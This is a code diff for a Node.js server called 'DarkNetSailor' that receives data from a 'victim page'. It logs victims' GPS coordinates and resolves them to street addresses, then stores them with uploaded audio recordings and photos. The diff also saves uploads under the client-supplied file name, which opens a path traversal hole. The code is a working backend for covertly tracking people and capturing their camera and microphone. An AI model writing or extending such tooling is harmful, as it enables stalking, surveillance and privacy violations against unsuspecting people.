@@ -4,59 +4,74 @@ const path = require('path');
 const fs = require('fs');
 const WebSocket = require('ws');
 const cors = require('cors');
+const axios = require('axios');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// إعداد CORS والملفات الثابتة
 app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json({ limit: '50mb' }));
 
-// إعداد Multer لحفظ الملفات
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
-        cb(null, 'uploads/');
+        const dir = 'uploads/';
+        if (!fs.existsSync(dir)) fs.mkdirSync(dir);
+        cb(null, dir);
     },
     filename: (req, file, cb) => {
-        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
-        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
+        cb(null, file.originalname);
     }
 });
 const upload = multer({ storage: storage });
 
-// إعداد WebSocket للوحة التحكم
 const server = app.listen(PORT, () => {
+    console.log(`\n=========================================`);
     console.log(`[+] DarkNetSailor Server running on port ${PORT}`);
-    console.log(`[+] Open http://localhost:${PORT} to view the victim page.`);
+    console.log(`[+] Open http://localhost:${PORT}`);
+    console.log(`=========================================\n`);
 });
 const wss = new WebSocket.Server({ server });
 
-// دالة لإرسال إشعار للوحة التحكم
-function notifyDashboard(type, message) {
-    wss.clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify({ type, message, time: new Date().toISOString() }));
-        }
-    });
+async function getAddress(lat, lon) {
+    try {
+        const response = await axios.get(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=en`, {
+            headers: { 'User-Agent': 'DarkNetSailor/1.0' }
+        });
+        const address = response.data.address;
+        return `${address.road || 'N/A'}, ${address.city || address.town || address.village || 'N/A'}, ${address.state || 'N/A'}, ${address.country || 'N/A'}`;
+    } catch (error) {
+        return 'Address not found';
+    }
 }
 
-// مسار استقبال البيانات من الضحية
-app.post('/api/upload', upload.single('file'), (req, res) => {
+app.post('/api/upload', upload.single('file'), async (req, res) => {
     const { type, lat, lon, accuracy } = req.body;
     
     if (type === 'location') {
-        console.log(`[📍] Location Received: Lat ${lat}, Lon ${lon} (Accuracy: ${accuracy}m)`);
-        notifyDashboard('location', { lat, lon, accuracy });
-    } else if (req.file) {
-        console.log(`[📁] File Received: ${req.file.filename} (Type: ${type})`);
-        notifyDashboard(type, `File saved: ${req.file.filename}`);
+        const address = await getAddress(lat, lon);
+        console.log(`\n=========================================`);
+        console.log(`📍 New Location Received!`);
+        console.log(`🌍 Lat: ${lat} | Lon: ${lon}`);
+        console.log(`🏠 Address: ${address}`);
+        console.log(`=========================================\n`);
+        
+        const locationData = { latitude: lat, longitude: lon, accuracy, address, timestamp: new Date().toISOString() };
+        let locations = [];
+        try {
+            if (fs.existsSync('locations.json')) locations = JSON.parse(fs.readFileSync('locations.json', 'utf8'));
+        } catch (e) {}
+        locations.push(locationData);
+        fs.writeFileSync('locations.json', JSON.stringify(locations, null, 4));
+    } 
+    else if (req.file) {
+        if (type === 'audio') console.log(`[🎤] Audio: ${req.file.filename}`);
+        else if (type === 'photo') console.log(`[📸] Photo: ${req.file.filename}`);
     }
     
     res.status(200).send('OK');
 });
 
-// مسار WebSocket للوحة التحكم
 wss.on('connection', (ws) => {
-    console.log('[*] Dashboard connected to WebSocket.');
+    console.log('[*] Dashboard connected.');
 });
